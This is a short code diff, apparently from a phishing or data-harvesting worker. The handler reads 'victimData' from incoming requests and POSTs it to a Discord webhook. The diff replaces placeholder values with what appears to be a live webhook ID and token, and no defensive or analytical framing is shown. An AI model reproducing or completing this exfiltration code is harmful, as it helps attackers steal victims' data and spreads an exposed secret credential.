@@ -8,7 +8,7 @@ async function handleRequest(request) {
     const victimData = await request.json()
     
     // 1. INSTANT DISCORD NOTIFICATION
-    await fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN', {
+    await fetch('https://discord.com/api/webhooks/1497889291399991296/MB9RxSUm_HfhQy74HUk9P5ImLWIsBMzXU7yp15WeGDX76kK5KTo8DUT9hK_5-XKCSwI-', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
